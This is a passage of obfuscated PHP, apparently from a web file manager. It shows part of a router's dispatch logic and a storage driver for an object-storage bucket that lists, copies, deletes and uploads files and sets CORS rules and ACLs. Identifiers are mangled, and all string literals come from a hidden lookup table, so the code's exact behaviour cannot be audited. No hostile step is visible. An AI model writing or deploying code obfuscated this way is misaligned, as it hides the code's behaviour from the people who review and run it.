{ $ÜÛâ¦ÖÖ = explode($’ˆòî±ã[8], self::$callbacks[$«§ËçÊ]); $’¿ú„Í = end($ÜÛâ¦ÖÖ); $®äÓ¡¶˜ = explode($’ˆòî±ã[1280], $’¿ú„Í); $ÜÍ£ğ»ú = new $®äÓ¡¶˜[0](); $ÜÍ£ğ»ú->{$®äÓ¡¶˜[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$«§ËçÊ]); if (self::$halts) { return; } } } } } else { $Ü©äÍĞ‚ = 0; foreach (self::$routes as $«§ËçÊ) { if (strpos($«§ËçÊ, $’ˆòî±ã[4]) !== !1) { $«§ËçÊ = str_replace($Ú‡‘öñ÷, $íùÕÄƒ÷, $«§ËçÊ); } if (preg_match($’ˆòî±ã[1698] . $«§ËçÊ . $’ˆòî±ã[1699], $ÓÜ„ñê¿, $œé–‡Û)) { if (self::$methods[$Ü©äÍĞ‚] == $Óé† || self::$methods[$Ü©äÍĞ‚] == $’ˆòî±ã[1697] || !empty(self::$maps[$Ü©äÍĞ‚]) && in_array($Óé†, self::$maps[$Ü©äÍĞ‚])) { $Å†½µ‰ñ = !0; array_shift($œé–‡Û); if (!is_object(self::$callbacks[$Ü©äÍĞ‚])) { $ÜÛâ¦ÖÖ = explode($’ˆòî±ã[8], self::$callbacks[$Ü©äÍĞ‚]); $’¿ú„Í = end($ÜÛâ¦ÖÖ); $®äÓ¡¶˜ = explode($’ˆòî±ã[1280], $’¿ú„Í); $ÜÍ£ğ»ú = new $®äÓ¡¶˜[0](); if (!method_exists($ÜÍ£ğ»ú, $®äÓ¡¶˜[1])) { echo $’ˆòî±ã[1700]; } else { call_user_func_array(array($ÜÍ£ğ»ú, $®äÓ¡¶˜[1]), $œé–‡Û); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Ü©äÍĞ‚], $œé–‡Û); if (self::$halts) { return; } } } } $Ü©äÍĞ‚++; } } if ($Å†½µ‰ñ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $‚²çååê =& $_SERVER[óÔë„ú]; header($_SERVER[$‚²çååê[1701]] . $‚²çååê[1702]); echo $‚²çååê[1703]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$’ˆòî±ã[1696]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto EğÁ¾Û¢Ä; BšÎ¿ï‡¼Ã: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($Ù·åÀİÄ) { parent::__construct(); include_once SDK_DIR . $_SERVER[óÔë„ú][1447]; $this->_init($Ù·åÀİÄ); } public function _init($şô¤Ÿ…Ò) { $ÄúñşŠó =& $_SERVER[óÔë„ú]; $this->config = $şô¤Ÿ…Ò; foreach ($şô¤Ÿ…Ò as $ß˜ò½Èş => $½™Ã˜˜Í) { if (isset($this->{$ß˜ò½Èş})) { $this->{$ß˜ò½Èş} = $½™Ã˜˜Í; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÄúñşŠó[1448] . LNG($ÄúñşŠó[1449])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ü•àÑ±¶ =& $_SERVER[óÔë„ú]; $´Ç™äåâ = new OSS\Model\CorsConfig(); $Œ­òø = new OSS\Model\CorsRule(); $Œ­òø->addAllowedOrigin($ü•àÑ±¶[1450]); $Œ­òø->addAllowedMethod($ü•àÑ±¶[1451]); $Œ­òø->addAllowedMethod($ü•àÑ±¶[1452]); $Œ­òø->addAllowedMethod($ü•àÑ±¶[1453]); $Œ­òø->addAllowedMethod($ü•àÑ±¶[1454]); $Œ­òø->addAllowedMethod($ü•àÑ±¶[165]); $Œ­òø->setMaxAgeSeconds(600); $Œ­òø->addExposeHeader($ü•àÑ±¶[1455]); $Œ­òø->addAllowedHeader($ü•àÑ±¶[1450]); $´Ç™äåâ->addRule($Œ­òø); try { $this->client->putBucketCors($this->bucket, $´Ç™äåâ); } catch (OSS\Core\OssException $·‚ùşÅ´) { $this->writeLog(__FUNCTION__ . $ü•àÑ±¶[214] . $·‚ùşÅ´->getMessage()); return !1; } return !0; } public function getBucketCors() { $¬®óÑË =& $_SERVER[óÔë„ú]; $å³İ²Õ¦ = null; try { $å³İ²Õ¦ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¥…™Ã‹˜) { $this->writeLog(__FUNCTION__ . $¬®óÑË[214] . $¥…™Ã‹˜->getMessage()); return null; } if (!$å³İ²Õ¦ || !($Ù¾Ø§ƒ = $å³İ²Õ¦->getRules())) { return null; } $¯º­€ = $Ù¾Ø§ƒ[0]->getAllowedOrigins(); $ùŒ¯ÎÌî = $Ù¾Ø§ƒ[0]->getAllowedMethods(); $ŸªÑ÷İÑ = $Ù¾Ø§ƒ[0]->getMaxAgeSeconds(); $íÌš™¶µ = $Ù¾Ø§ƒ[0]->getExposeHeaders(); $õì¥ºğÆ = $Ù¾Ø§ƒ[0]->getAllowedHeaders(); return array($¬®óÑË[218] => isset($¯º­€[0]) ? $¯º­€[0] : $¬®óÑË[12], $¬®óÑË[222] => $ùŒ¯ÎÌî, $¬®óÑË[1456] => $ŸªÑ÷İÑ, $¬®óÑË[1457] => isset($íÌš™¶µ[0]) ? $íÌš™¶µ[0] : $¬®óÑË[12], $¬®óÑË[219] => isset($õì¥ºğÆ[0]) ? $õì¥ºğÆ[0] : $¬®óÑË[12]); } public function isBucketCors() { $šÜ»İ¿¯ =& $_SERVER[óÔë„ú]; $ˆš¦óÒ„ = $this->getBucketCors(); if (!$ˆš¦óÒ„ || !is_array($ˆš¦óÒ„)) { return !1; } if ($ˆš¦óÒ„[$šÜ»İ¿¯[218]] != $šÜ»İ¿¯[220] || $ˆš¦óÒ„[$šÜ»İ¿¯[219]] != $šÜ»İ¿¯[220]) { return !1; } $ÕÆ«ÈÉÓ = array_map($šÜ»İ¿¯[221], $ˆš¦óÒ„[$šÜ»İ¿¯[222]]); if (!is_array($ÕÆ«ÈÉÓ)) { $ÕÆ«ÈÉÓ = array(); } $£ğ”³®ç = array($šÜ»İ¿¯[223], $šÜ»İ¿¯[224], $šÜ»İ¿¯[225], $šÜ»İ¿¯[226], $šÜ»İ¿¯[227]); $Ø²ı¹¿´ = array_diff($£ğ”³®ç, $ÕÆ«ÈÉÓ); return empty($Ø²ı¹¿´); } public function mkfile($óÓºÁµ, $‚ÅÒÚÇ´ = '', $Ä„îõ§• = REPEAT_RENAME) { $Ôì†ÓÈÃ = $this->setContent($óÓºÁµ, $‚ÅÒÚÇ´); if ($Ôì†ÓÈÃ !== !1) { return $this->getPathOuter($óÓºÁµ); } return !1; } public function mkdir($‘ƒ›«¥Ë, $ßóöì = REPEAT_SKIP) { if ($ßóöì && $this->_isFolder($‘ƒ›«¥Ë)) { return $this->getPathOuter($‘ƒ›«¥Ë); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($‘ƒ›«¥Ë)); } catch (OSS\Core\OssException $Ş‘†áŞ®) { $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][214] . $Ş‘†áŞ®->getMessage()); return !1; } return $this->getPathOuter($‘ƒ›«¥Ë); } private function fileList($‰ÃüÔ¤‡, $Şµ²¤ = '', $§Ï®å„” = 0) { $Çèë‹ª’ =& $_SERVER[óÔë„ú]; $‰ÃüÔ¤‡ = trim($‰ÃüÔ¤‡, $Çèë‹ª’[8]); $àî”öı‰ = empty($‰ÃüÔ¤‡) && $‰ÃüÔ¤‡ !== $Çèë‹ª’[228] ? $Çèë‹ª’[12] : $‰ÃüÔ¤‡ . $Çèë‹ª’[8]; $‹Ú™Åµ = $Çèë‹ª’[12]; $¾’¸¯× = 1000; $£ÖÜğ“› = $ˆŸ˜‚÷¾ = array(); while (!0) { check_abort(); $Şïâ¬ü¬ = array($Çèë‹ª’[1458] => $Şµ²¤, $Çèë‹ª’[1459] => $àî”öı‰, $Çèë‹ª’[1460] => $¾’¸¯×, $Çèë‹ª’[1461] => $‹Ú™Åµ); try { $ıÜµôîÇ = $this->client->listObjects($this->bucket, $Şïâ¬ü¬); } catch (OSS\Core\OssException $¸ç½¸Àß) { $this->writeLog(__FUNCTION__ . $Çèë‹ª’[214] . $¸ç½¸Àß->getMessage()); break; } $‹Ú™Åµ = $ıÜµôîÇ->getNextMarker(); $ÔÜ¡¿©ô = $ıÜµôîÇ->getObjectList(); $Ê Ú×Ìï = $ıÜµôîÇ->getPrefixList(); foreach ($ÔÜ¡¿©ô as $õÀˆ”ºŠ) { if ($õÀˆ”ºŠ->getKey() == $àî”öı‰) { continue; } $øŸõøç¿ = $õÀˆ”ºŠ->getKey(); $†ÀºÈ¬¸ = $õÀˆ”ºŠ->getSize(); $­ºğÓÔ = $õÀˆ”ºŠ->getLastModified(); $„¨ÓÆğ = trim($õÀˆ”ºŠ->getETag(), $Çèë‹ª’[121]); $“Ô›³Å = $§Ï®å„” ? array($Çèë‹ª’[32] => $øŸõøç¿, $Çèë‹ª’[79] => $†ÀºÈ¬¸, $Çèë‹ª’[206] => strtotime($­ºğÓÔ), $Çèë‹ª’[1462] => $„¨ÓÆğ) : $øŸõøç¿; $çèÃêÒ = $†ÀºÈ¬¸ == 0 && substr($øŸõøç¿, strlen($øŸõøç¿) - 1, 1) == $Çèë‹ª’[8] ? !0 : !1; $­ËÑ¼•• = array($Çèë‹ª’[79] => $†ÀºÈ¬¸, $Çèë‹ª’[1463] => $†ÀºÈ¬¸, $Çèë‹ª’[88] => strtotime($­ºğÓÔ), $Çèë‹ª’[1464] => $­ºğÓÔ, $Çèë‹ª’[1462] => $„¨ÓÆğ); $this->cacheMethodInfoSet($øŸõøç¿, $çèÃêÒ, $­ËÑ¼••); if ($çèÃêÒ) { $£ÖÜğ“›[] = $øŸõøç¿; continue; } $ˆŸ˜‚÷¾[] = $“Ô›³Å; } foreach ($Ê Ú×Ìï as $¶§ş¾À) { $£ÖÜğ“›[] = $¶§ş¾À->getPrefix(); $this->cacheMethodInfoSet($¶§ş¾À->getPrefix(), !0); } if ($‹Ú™Åµ === $Çèë‹ª’[12]) { break; } } $this->cacheMethodInfoSet($‰ÃüÔ¤‡, !0); return array($Çèë‹ª’[85] => $£ÖÜğ“›, $Çèë‹ª’[86] => $ˆŸ˜‚÷¾); } public function listObject($§öˆÒ®—, $şÁÉëû = '') { $š¸Ô÷‘ =& $_SERVER[óÔë„ú]; $§öˆÒ®— = trim($§öˆÒ®—, $š¸Ô÷‘[8]); $ş³âÔóà = empty($§öˆÒ®—) && $§öˆÒ®— !== $š¸Ô÷‘[228] ? $š¸Ô÷‘[12] : $§öˆÒ®— . $š¸Ô÷‘[8]; $´È­Ïöô = $š¸Ô÷‘[12]; $ÆÆçêÃ‹ = 1000; $ª¹Ùğ›™ = $Ş¯ïáıç = array(); while (!0) { check_abort(); $³ù÷‡îÂ = array($š¸Ô÷‘[1458] => $şÁÉëû, $š¸Ô÷‘[1459] => $ş³âÔóà, $š¸Ô÷‘[1460] => $ÆÆçêÃ‹, $š¸Ô÷‘[1461] => $´È­Ïöô); try { $®ŠŞ­¸½ = $this->client->listObjects($this->bucket, $³ù÷‡îÂ); } catch (OSS\Core\OssException $Å†§õŒ¾) { $this->writeLog(__FUNCTION__ . $š¸Ô÷‘[214] . $Å†§õŒ¾->getMessage()); break; } $´È­Ïöô = $®ŠŞ­¸½->getNextMarker(); $’ÌÍÌéÂ = $®ŠŞ­¸½->getObjectList(); foreach ($’ÌÍÌéÂ as $æ›çøı) { if ($æ›çøı->getKey() == $ş³âÔóà) { continue; } $­½‘®Ç = $æ›çøı->getKey(); $öíàÖ› = $æ›çøı->getSize(); $¿êÛ‡‚¹ = $öíàÖ› == 0 && substr($­½‘®Ç, strlen($­½‘®Ç) - 1, 1) == $š¸Ô÷‘[8] ? !0 : !1; if ($¿êÛ‡‚¹) { continue; } (yield $öíàÖ› . $š¸Ô÷‘[214] . $­½‘®Ç); } if ($´È­Ïöô === $š¸Ô÷‘[12]) { break; } } } public function copyFile($—Äãˆ®¶, $ãüÂºõù) { $ÙØ¬¾„ = $this->size($—Äãˆ®¶); if ($ÙØ¬¾„ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $—Äãˆ®¶, $this->bucket, $this->pathEncode($ãüÂºõù)); } catch (OSS\Core\OssException $«ŸÂƒ×œ) { $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][214] . $«ŸÂƒ×œ->getMessage()); return !1; } return $this->getPathOuter($ãüÂºõù); } $¡òôá‚ø = $this->multiCopyObject($—Äãˆ®¶, $ãüÂºõù, $ÙØ¬¾„); return $¡òôá‚ø ? $this->getPathOuter($ãüÂºõù) : !1; } private function multiCopyObject($ÈÒÑü¨, $Åşí±Â­, $†® €Ê­) { $“Ëï„½Š =& $_SERVER[óÔë„ú]; try { $õº¢‰å = array(); if ($ûúÎèÎÜ = $this->hashMd5($ÈÒÑü¨)) { $õº¢‰å = array(OSS\OssClient::OSS_HEADERS => array($“Ëï„½Š[1465] => $ûúÎèÎÜ)); } $øúÛ–í³ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Åşí±Â­), $õº¢‰å); $‚Æ¨ÎÚ½ = 1; $Ûİ’­İ÷ = 0; $èø÷™ä = array(); $†Ô¹àÓü = 1024 * 1024 * 10; $¾ÁÓ…è‹ = $this->client->generateMultiuploadParts($†® €Ê­, $†Ô¹àÓü); foreach ($¾ÁÓ…è‹ as $Û»ûå†Ô => $¤íïíú) { $›¼İê£ = $Ûİ’­İ÷ + (int) $¤íïíú[$“Ëï„½Š[1466]]; $ä„Ñ—à = (int) $¤íïíú[$“Ëï„½Š[413]] + $›¼İê£ - 1; $õï¦ïï = array($“Ëï„½Š[167] => $›¼İê£, $“Ëï„½Š[168] => $ä„Ñ—à); $èø÷™ä[] = $this->client->uploadPartCopy($this->bucket, $ÈÒÑü¨, $this->bucket, $this->pathEncode($Åşí±Â­), $‚Æ¨ÎÚ½, $øúÛ–í³, $õï¦ïï); $‚Æ¨ÎÚ½ = $‚Æ¨ÎÚ½ + 1; } $ñ÷ÚºàÙ = array(); foreach ($èø÷™ä as $Û»ûå†Ô => $¿Öˆ—»å) { $ñ÷ÚºàÙ[] = array($“Ëï„½Š[308] => $Û»ûå†Ô + 1, $“Ëï„½Š[309] => $¿Öˆ—»å); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Åşí±Â­), $øúÛ–í³, $ñ÷ÚºàÙ); } catch (OSS\Core\OssException $šğ­Ÿ¤ø) { $this->writeLog(__FUNCTION__ . $“Ëï„½Š[214] . $šğ­Ÿ¤ø->getMessage()); return !1; } return !0; } public function moveFile($è¢í®Âù, $ãëíÔ˜°) { if ($this->copyFile($è¢í®Âù, $ãëíÔ˜°)) { $this->remove($è¢í®Âù); return $this->getPathOuter($ãëíÔ˜°); } return !1; } public function delFile($äÏ™Íà) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($äÏ™Íà)); } catch (OSS\Core\OssException $ÔÉ¸Ìùû) { $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][214] . $ÔÉ¸Ìùû->getMessage()); return !1; } return !0; } public function delFolder($ÍÁ²ÌÂÂ) { $•¹ğıÙ =& $_SERVER[óÔë„ú]; if (!$this->exist($ÍÁ²ÌÂÂ)) { return !0; } $this->listItemCache = !1; $¸„é‰  = $this->fileList($ÍÁ²ÌÂÂ); $this->listItemCache = !0; $ğØÅ½š = trim($ÍÁ²ÌÂÂ, $•¹ğıÙ[8]) . $•¹ğıÙ[8]; if (!empty($ÍÁ²ÌÂÂ) && $ÍÁ²ÌÂÂ !== $•¹ğıÙ[228] && !in_array($ğØÅ½š, $¸„é‰ [$•¹ğıÙ[85]])) { $¸„é‰ [$•¹ğıÙ[85]][] = $ğØÅ½š; } $€„» Ì = $this->delByBatch($¸„é‰ [$•¹ğıÙ[86]]); if (!$€„» Ì) { return !1; } $€„» Ì = $this->delByBatch($¸„é‰ [$•¹ğıÙ[85]]); if (!$€„» Ì) { return !1; } return $this->delFile($ğØÅ½š); } private function delByBatch($¿®äÒƒŸ) { foreach (array_chunk($¿®äÒƒŸ, 1000) as $¤ßóÏÀ) { try { $this->client->deleteObjects($this->bucket, $¤ßóÏÀ); } catch (OSS\Core\OssException $”ó¨Ç€®) { $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][214] . $”ó¨Ç€®->getMessage()); return !1; } } return !0; } public function rename($ëºÇ§šÚ, $ãÓ°º¢) { return $this->renameObject($ëºÇ§šÚ, $ãÓ°º¢); } private function fileInfo($¶—•¨ØÈ, $ßå®É‰ = false, $üœÁì — = array()) { $óÓŞ¥¾­ =& $_SERVER[óÔë„ú]; $á¥â™ = array($óÓŞ¥¾­[32] => $this->pathThis($¶—•¨ØÈ), $óÓŞ¥¾­[87] => $this->getPathOuter($¶—•¨ØÈ), $óÓŞ¥¾­[33] => $óÓŞ¥¾­[230], $óÓŞ¥¾­[79] => isset($üœÁì —[$óÓŞ¥¾­[79]]) ? $üœÁì —[$óÓŞ¥¾­[79]] : 0, $óÓŞ¥¾­[169] => $this->ext($¶—•¨ØÈ)); if ($ßå®É‰) { return $á¥â™; } $á¥â™[$óÓŞ¥¾­[231]] = $á¥â™[$óÓŞ¥¾­[88]] = 0; $á¥â™[$óÓŞ¥¾­[232]] = $á¥â™[$óÓŞ¥¾­[233]] = !0; if (empty($üœÁì —)) { $·Ø¡Âã = $this->objectMeta($¶—•¨ØÈ); if (!$·Ø¡Âã) { return $á¥â™; } $üœÁì — = array($óÓŞ¥¾­[88] => strtotime($·Ø¡Âã[$óÓŞ¥¾­[1464]]), $óÓŞ¥¾­[79] => $·Ø¡Âã[$óÓŞ¥¾­[1463]] + 0, $óÓŞ¥¾­[1462] => $·Ø¡Âã[$óÓŞ¥¾­[1462]]); } if (isset($üœÁì —[$óÓŞ¥¾­[1462]]) && $üœÁì —[$óÓŞ¥¾­[1462]]) { $á¥â™[$óÓŞ¥¾­[235]] = trim($üœÁì —[$óÓŞ¥¾­[1462]], $óÓŞ¥¾­[121]); } if (isset($üœÁì —[$óÓŞ¥¾­[79]])) { $á¥â™[$óÓŞ¥¾­[79]] = $üœÁì —[$óÓŞ¥¾­[79]]; } if (isset($üœÁì —[$óÓŞ¥¾­[88]])) { $á¥â™[$óÓŞ¥¾­[88]] = $üœÁì —[$óÓŞ¥¾­[88]]; } if (isset($üœÁì —[$óÓŞ¥¾­[206]]) && !trim($á¥â™[$óÓŞ¥¾­[88]])) { $á¥â™[$óÓŞ¥¾­[88]] = $üœÁì —[$óÓŞ¥¾­[206]]; } return $á¥â™; } private function folderInfo($Â‡È€¯Ì, $Ò´–«®È = false, $‚Ôƒåƒ‰ = array()) { $¦ôÍéïš =& $_SERVER[óÔë„ú]; $œÌû£í = array($¦ôÍéïš[32] => $this->pathThis($Â‡È€¯Ì), $¦ôÍéïš[87] => $this->getPathOuter($¦ôÍéïš[8] . $Â‡È€¯Ì), $¦ôÍéïš[33] => $¦ôÍéïš[78]); if ($Ò´–«®È) { return $œÌû£í; } $œÌû£í[$¦ôÍéïš[231]] = $œÌû£í[$¦ôÍéïš[88]] = 0; $œÌû£í[$¦ôÍéïš[232]] = $œÌû£í[$¦ôÍéïš[233]] = !0; if (empty($‚Ôƒåƒ‰)) { $Â‡È€¯Ì = rtrim($Â‡È€¯Ì, $¦ôÍéïš[8]) . $¦ôÍéïš[8]; $êö¾òíÎ = $this->objectMeta($Â‡È€¯Ì); if (!$êö¾òíÎ) { return $œÌû£í; } $‚Ôƒåƒ‰ = array($¦ôÍéïš[231] => $êö¾òíÎ[$¦ôÍéïš[575]][$¦ôÍéïš[1467]], $¦ôÍéïš[88] => strtotime($êö¾òíÎ[$¦ôÍéïš[1464]])); } if (isset($‚Ôƒåƒ‰[$¦ôÍéïš[88]])) { $œÌû£í[$¦ôÍéïš[88]] = $‚Ôƒåƒ‰[$¦ôÍéïš[88]]; } if (isset($‚Ôƒåƒ‰[$¦ôÍéïš[231]])) { $œÌû£í[$¦ôÍéïš[231]] = $‚Ôƒåƒ‰[$¦ôÍéïš[231]]; } return $œÌû£í; } public function listPath($ÁÅ¬©è€, $şÊŞÏ¦€ = false) { $êñ°Ó¬œ =& $_SERVER[óÔë„ú]; $Ù­õãöÉ = $this->fileList($ÁÅ¬©è€, $êñ°Ó¬œ[8], !0); foreach ($Ù­õãöÉ[$êñ°Ó¬œ[85]] as $·ÏÇîşı => $ÇÒƒÅ—Æ) { $Ù­õãöÉ[$êñ°Ó¬œ[85]][$·ÏÇîşı] = $this->folderInfo($ÇÒƒÅ—Æ, $şÊŞÏ¦€, $ÇÒƒÅ—Æ); } foreach ($Ù­õãöÉ[$êñ°Ó¬œ[86]] as $·ÏÇîşı => $ÇÒƒÅ—Æ) { $Ù­õãöÉ[$êñ°Ó¬œ[86]][$·ÏÇîşı] = $this->fileInfo($ÇÒƒÅ—Æ[$êñ°Ó¬œ[32]], $şÊŞÏ¦€, $ÇÒƒÅ—Æ); } return $Ù­õãöÉ; } protected function infoChildren($¤©åÕÛ, &$ƒİó‹ğï) { $ËØ‹®° =& $_SERVER[óÔë„ú]; $º„“® = $this->fileList($¤©åÕÛ, $ËØ‹®°[12], !0); $ƒİó‹ğï[$ËØ‹®°[81]] += count($º„“®[$ËØ‹®°[85]]); $ƒİó‹ğï[$ËØ‹®°[80]] += count($º„“®[$ËØ‹®°[86]]); foreach ($º„“®[$ËØ‹®°[86]] as $¯—¼ò‡—) { if (!$¯—¼ò‡— || !$¯—¼ò‡—[$ËØ‹®°[79]]) { continue; } $ƒİó‹ğï[$ËØ‹®°[79]] += $¯—¼ò‡—[$ËØ‹®°[79]]; } } public function has($ˆãáÏŠ, $‡Ìœâ¾³ = false, $ÂÁ´´ö÷ = true) { $‰ÌÛ¶§£ =& $_SERVER[óÔë„ú]; $ˆãáÏŠ = trim($ˆãáÏŠ, $‰ÌÛ¶§£[8]); $ÛãŠÎÙû = empty($ˆãáÏŠ) && $ˆãáÏŠ !== $‰ÌÛ¶§£[228] ? $‰ÌÛ¶§£[12] : $ˆãáÏŠ . $‰ÌÛ¶§£[8]; $‰‹êÆÂ = $‰ÌÛ¶§£[12]; $˜ ûÁœà = 500; $ñ½Ìæ³© = $¸²½ƒ›Ş = 0; while (!0) { check_abort(); $®İïåÍÙ = array($‰ÌÛ¶§£[1458] => $‰ÌÛ¶§£[8], $‰ÌÛ¶§£[1459] => $ÛãŠÎÙû, $‰ÌÛ¶§£[1460] => $˜ ûÁœà, $‰ÌÛ¶§£[1461] => $‰‹êÆÂ); try { $ÚÒ¡‡§¸ = $this->client->listObjects($this->bucket, $®İïåÍÙ); } catch (OSS\Core\OssException $‚Ü¹Ò€Î) { $this->writeLog(__FUNCTION__ . $‰ÌÛ¶§£[214] . $‚Ü¹Ò€Î->getMessage()); break; } $‰‹êÆÂ = $ÚÒ¡‡§¸->getNextMarker(); $µ¹—Ë‰ˆ = $ÚÒ¡‡§¸->getObjectList(); $Ñ…°ƒĞò = $ÚÒ¡‡§¸->getPrefixList(); if ($‡Ìœâ¾³) { if (count($µ¹—Ë‰ˆ) > 1 || count($µ¹—Ë‰ˆ) == 1 && $µ¹—Ë‰ˆ[0]->getKey() != $ÛãŠÎÙû) { $ñ½Ìæ³© += count($µ¹—Ë‰ˆ) - 1; } if (!empty($Ñ…°ƒĞò)) { $¸²½ƒ›Ş += count($Ñ…°ƒĞò); } if ($‰‹êÆÂ === $‰ÌÛ¶§£[12]) { break; } continue; } if ($ÂÁ´´ö÷) { if (!empty($µ¹—Ë‰ˆ)) { if (count($µ¹—Ë‰ˆ) > 1 || $µ¹—Ë‰ˆ[0]->getKey() != $ÛãŠÎÙû) { return !0; } } } else { if (!empty($Ñ…°ƒĞò)) { return !0; } } if ($‰‹êÆÂ === $‰ÌÛ¶§£[12]) { break; } } if ($‡Ìœâ¾³) { return array($‰ÌÛ¶§£[239] => $ñ½Ìæ³©, $‰ÌÛ¶§£[240] => $¸²½ƒ›Ş); } return !1; } public function listAll($ŸË¿†ÖÁ) { $–ø—ªÁŒ =& $_SERVER[óÔë„ú]; $¥‡ó™Ã˜ = $this->fileList($ŸË¿†ÖÁ, $–ø—ªÁŒ[12], !0); $ËúÁ¹­İ = array_to_keyvalue($¥‡ó™Ã˜[$–ø—ªÁŒ[86]], $–ø—ªÁŒ[32]); foreach ($¥‡ó™Ã˜[$–ø—ªÁŒ[85]] as $Ïó¿ûÉ¸) { if (is_string($Ïó¿ûÉ¸)) { $ËúÁ¹­İ[$Ïó¿ûÉ¸] = array($–ø—ªÁŒ[79] => 0); } } return $this->listAllFiles($ŸË¿†ÖÁ, $ËúÁ¹­İ); } public function canRead($ôË–Î½À) { $‡Í›âÎë =& $_SERVER[óÔë„ú]; $è–›şÒí = $this->pathAcl($ôË–Î½À); return $è–›şÒí == $‡Í›âÎë[1468] || $è–›şÒí == $‡Í›âÎë[619] ? !0 : !1; } public function canWrite($ê•‹® †) { $µŠñ†İ = $this->pathAcl($ê•‹® †); return $µŠñ†İ == $_SERVER[óÔë„ú][619] ? !0 : !1; } public function pathAcl($€½ıâ¹) { $úŞ‘ë¬ =& $_SERVER[óÔë„ú]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ü™óëè = $this->client->getObjectAcl($this->bucket, $this->pathEncode($€½ıâ¹)); } catch (OSS\Core\OssException $ñ…ÜßÑØ) { $this->writeLog(__FUNCTION__ . $úŞ‘ë¬[214] . $ñ…ÜßÑØ->getMessage()); return !1; } $ÙÈëˆà = $ü™óëè == $úŞ‘ë¬[37] ? $this->bucketAcl : $ü™óëè; if ($ÙÈëˆà == $úŞ‘ë¬[1469]) { return $úŞ‘ë¬[1468]; } if ($ÙÈëˆà == $úŞ‘ë¬[1470]) { return $úŞ‘ë¬[619]; } return $ÙÈëˆà; } private function chmodPath($¸ªäçªó, $Å÷Â–µÌ = '') { $¥Ç°®ôè =& $_SERVER[óÔë„ú]; $ùŒñ’ü» = empty($Å÷Â–µÌ) ? $¥Ç°®ôè[1470] : $Å÷Â–µÌ; $ºİ¦»ÔŒ = array($¥Ç°®ôè[37], $¥Ç°®ôè[229], $¥Ç°®ôè[1469], $¥Ç°®ôè[1470]); if (!in_array($ùŒñ’ü», $ºİ¦»ÔŒ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¸ªäçªó), $ùŒñ’ü»); } catch (OSS\Core\OssException $º÷ÇÊï‚) { $this->writeLog(__FUNCTION__ . $¥Ç°®ôè[214] . $º÷ÇÊï‚->getMessage()); return !1; } return !0; } public function getContent($ßÌÒŞóÌ) { return $this->fileSubstr($ßÌÒŞóÌ, -1); } public function setContent($ù·í¹Å¢, $Ë¼Ææ›„ = '') { $ÁÔ“°Ï¯ =& $_SERVER[óÔë„ú]; try { $¢±øüö = $this->trafficLimit($ÁÔ“°Ï¯[1471]); $ÓÆƒ€ÛÛ = $this->client->putObject($this->bucket, $this->pathEncode($ù·í¹Å¢), $Ë¼Ææ›„, $¢±øüö); } catch (OSS\Core\OssException $†¤Î¡†£) { $this->writeLog(__FUNCTION__ . $ÁÔ“°Ï¯[214] . $†¤Î¡†£->getMessage()); return !1; } $¦ı¿É¹ä = array($ÁÔ“°Ï¯[1465] => trim($ÓÆƒ€ÛÛ[$ÁÔ“°Ï¯[1462]], $ÁÔ“°Ï¯[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ù·í¹Å¢))); $this->updateObjMeta($ù·í¹Å¢, $¦ı¿É¹ä); return isset($ÓÆƒ€ÛÛ[$ÁÔ“°Ï¯[1472]][$ÁÔ“°Ï¯[292]]) ? !0 : !1; } private function updateObjMeta($‰×™éú÷, $…Àù‡†) { $‰×™éú÷ = $this->pathEncode($‰×™éú÷); try { $›ÅÛ–ú½ = array(OSS\OssClient::OSS_HEADERS => $…Àù‡†); $this->client->copyObject($this->bucket, $‰×™éú÷, $this->bucket, $‰×™éú÷, $›ÅÛ–ú½); } catch (OSS\Core\OssException $û’‚İ’Ó) { $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][214] . $û’‚İ’Ó->getMessage()); return !1; } return !0; } public function upload($ğ‘¶Ôìü, $ã€ßÙô , $Ïä·¿²Œ = false, $›×Èªšü = REPEAT_REPLACE) { $š‚™€—ş =& $_SERVER[óÔë„ú]; $Ã·Œêï = trim($ğ‘¶Ôìü, $š‚™€—ş[8]); $ˆ´‘Õ˜‚ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($š‚™€—ş[1465] => @md5_file($ã€ßÙô )), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ğ‘¶Ôìü))); $ˆ´‘Õ˜‚ = $this->trafficLimit($š‚™€—ş[1471], $ˆ´‘Õ˜‚); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Ã·Œêï), $ã€ßÙô , $ˆ´‘Õ˜‚); } catch (OSS\Core\OssException $°§ò¿‘) { $this->writeLog(__FUNCTION__ . $š‚™€—ş[214] . $°§ò¿‘->getMessage()); return !1; } return $this->getPathOuter($ğ‘¶Ôìü); } public function getHost() { $§ß¯îÎê =& $_SERVER[óÔë„ú]; $ê£Ëß¤ = explode($§ß¯îÎê[210], parent::getHost()); return $ê£Ëß¤[0] . 